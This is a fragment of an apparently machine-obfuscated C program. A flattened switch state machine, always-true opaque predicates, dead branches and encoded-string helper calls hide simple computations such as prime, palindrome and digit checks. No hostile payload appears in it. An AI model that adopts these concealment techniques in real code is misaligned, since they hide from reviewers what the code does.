                {
                    (void)printf("%s\n", j_dc_140());
                }
                else
                {
                    volatile int64_t j_85qwutqy = ((j_oh0sw3nj * 2) + 1);
                }
                j_76zh2lsi = 5;
                break;
            case 5:
                (void)printf("%d\n", j_oiwo6t0n(0));
                static volatile int64_t j_17noej0r = 56955;
                if ((((j_17noej0r * j_17noej0r) + j_17noej0r) >= 0))
                {
                    (void)printf("%d\n", j_oiwo6t0n(5));
                }
                else
                {
                    volatile int64_t j_0ksabr2h = ((j_17noej0r * 2) + 1);
                }
                j_76zh2lsi = 6;
                break;
            case 6:
                (void)printf("%d\n", j_oiwo6t0n(8));
                static volatile int64_t j_cr5orrps = 63930;
                if ((((j_cr5orrps * j_cr5orrps) + j_cr5orrps) >= 0))
                {
                    (void)printf("%s\n", j_dc_141());
                }
                else
                {
                    volatile int64_t j_cnqg14qg = ((j_cr5orrps * 2) + 1);
                }
                j_76zh2lsi = 7;
                break;
            case 7:
                static volatile int64_t j_qpr98c2m = 44312;
                if ((((j_qpr98c2m * j_qpr98c2m) + j_qpr98c2m) >= 0))
                {
                    (void)printf("%d\n", j_vls2wrj8(48, 36));
                }
                else
                {
                    volatile int64_t j_3tuhslui = ((j_qpr98c2m * 2) + 1);
                }
                j_76zh2lsi = 8;
                break;
            case 8:
                static volatile int64_t j_gjjcndpq = 60293;
                if ((((j_gjjcndpq * j_gjjcndpq) + j_gjjcndpq) >= 0))
                {
                    (void)printf("%d\n", j_vls2wrj8(17, 5));
                }
                else
                {
                    volatile int64_t j_grn6l72x = ((j_gjjcndpq * 2) + 1);
                }
                j_76zh2lsi = 9;
                break;
            case 9:
                static volatile int64_t j_g3h3jvgx = 40393;
                if ((((j_g3h3jvgx * j_g3h3jvgx) + j_g3h3jvgx) >= 0))
                {
                    (void)printf("%d\n", j_vls2wrj8(100, 10));
                }
                else
                {
                    volatile int64_t j_rae6r2fb = ((j_g3h3jvgx * 2) + 1);
                }
                j_76zh2lsi = 10;
                break;
            case 10:
                (void)printf("%s\n", j_dc_142());
                (void)printf("%s\n", j_t8lvogp4(2) ? j_dc_143() : j_dc_144());
                (void)printf("%s\n", j_t8lvogp4(17) ? j_dc_145() : j_dc_146());
                (void)printf("%s\n", j_t8lvogp4(18) ? j_dc_147() : j_dc_148());
                (void)printf("%s\n", j_t8lvogp4(97) ? j_dc_149() : j_dc_150());
                (void)printf("%s\n", j_dc_151());
                for (int32_t j_qo32bb5q = 2; (j_qo32bb5q <= 30); j_qo32bb5q = (j_qo32bb5q + 1))
                {
                    if (j_t8lvogp4(j_qo32bb5q))
                    {
                        (void)printf("%d\n", j_qo32bb5q);
                    }
                }
                j_76zh2lsi = 11;
                break;
            case 11:
                static volatile int64_t j_9zf361hb = 72497;
                if ((((j_9zf361hb * j_9zf361hb) + j_9zf361hb) >= 0))
                {
                    (void)printf("%s\n", j_dc_152());
                }
                else
                {
                    volatile int64_t j_s8kz4vi9 = ((j_9zf361hb * 2) + 1);
                }
                j_76zh2lsi = 12;
                break;
            case 12:
                (void)printf("%d\n", j_vxxehlw0(1));
                static volatile int64_t j_7v7plshw = 93053;
                if ((((j_7v7plshw * j_7v7plshw) + j_7v7plshw) >= 0))
                {
                    (void)printf("%d\n", j_vxxehlw0(27));
                }
                else
                {
                    volatile int64_t j_u3gu1f94 = ((j_7v7plshw * 2) + 1);
                }
                j_76zh2lsi = 13;
                break;
            case 13:
                (void)printf("%d\n", j_vxxehlw0(6));
                (void)printf("%s\n", j_dc_153());
                static volatile int64_t j_ofao25xe = 1887;
                if ((((j_ofao25xe * j_ofao25xe) + j_ofao25xe) >= 0))
                {
                    (void)printf("%d\n", j_m3tuz7o1(0));
                }
                else
                {
                    volatile int64_t j_xj6ndiho = ((j_ofao25xe * 2) + 1);
                }
                j_76zh2lsi = 14;
                break;
            case 14:
                (void)printf("%d\n", j_m3tuz7o1(12345));
                (void)printf("%d\n", j_m3tuz7o1(999));
                static volatile int64_t j_ffqn8op7 = 53282;
                if ((((j_ffqn8op7 * j_ffqn8op7) + j_ffqn8op7) >= 0))
                {
                    (void)printf("%s\n", j_dc_154());
                }
                else
                {
                    volatile int64_t j_tfol4141 = ((j_ffqn8op7 * 2) + 1);
                }
                j_76zh2lsi = 15;
                break;
            case 15:
                (void)printf("%d\n", j_dwwcl9v0(12345));
                static volatile int64_t j_pvwnb34a = 27445;
                if ((((j_pvwnb34a * j_pvwnb34a) + j_pvwnb34a) >= 0))
                {
                    (void)printf("%d\n", j_dwwcl9v0(-(123)));
                }
                else
                {
                    volatile int64_t j_liko43bd = ((j_pvwnb34a * 2) + 1);
                }
                j_76zh2lsi = 16;
                break;
            case 16:
                (void)printf("%d\n", j_dwwcl9v0(7));
                (void)printf("%s\n", j_dc_155());
                static volatile int64_t j_tc75tvri = 62587;
                if ((((j_tc75tvri * j_tc75tvri) + j_tc75tvri) >= 0))
                {
                    (void)printf("%d\n", j_u1jd8trj(2, 10));
                }
                else
                {
                    volatile int64_t j_bujcm0h3 = ((j_tc75tvri * 2) + 1);
                }
                j_76zh2lsi = 17;
                break;
            case 17:
                (void)printf("%d\n", j_u1jd8trj(3, 3));
                (void)printf("%d\n", j_u1jd8trj(5, 0));
                (void)printf("%s\n", j_dc_156());
                (void)printf("%d\n", j_w6mesi0m(3, 9, 6));
                static volatile int64_t j_fn1iksnr = 55583;
                if ((((j_fn1iksnr * j_fn1iksnr) + j_fn1iksnr) >= 0))
                {
                    (void)printf("%d\n", j_gutsi31n(3, 9, 6));
                }
                else
                {
                    volatile int64_t j_56c7eycx = ((j_fn1iksnr * 2) + 1);
                }
                j_76zh2lsi = 18;
                break;
            case 18:
                static volatile int64_t j_5w4kujpr = 32972;
                if ((((j_5w4kujpr * j_5w4kujpr) + j_5w4kujpr) >= 0))
                {
                    (void)printf("%d\n", j_w6mesi0m(-(5), -(1), -(3)));
                }
                else
                {
                    volatile int64_t j_14vod2s2 = ((j_5w4kujpr * 2) + 1);
                }
                j_76zh2lsi = 19;
                break;
            case 19:
                static volatile int64_t j_1wb4ebz5 = 97722;
                if ((((j_1wb4ebz5 * j_1wb4ebz5) + j_1wb4ebz5) >= 0))
                {
                    (void)printf("%s\n", j_dc_157());
                }
                else
                {
                    volatile int64_t j_xdco6bu7 = ((j_1wb4ebz5 * 2) + 1);
                }
                j_76zh2lsi = 20;
                break;
            case 20:
                (void)printf("%s\n", j_dk9e63to(121) ? j_dc_158() : j_dc_159());
                (void)printf("%s\n", j_dk9e63to(12321) ? j_dc_160() : j_dc_161());
                (void)printf("%s\n", j_dk9e63to(123) ? j_dc_162() : j_dc_163());
                j_76zh2lsi = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}
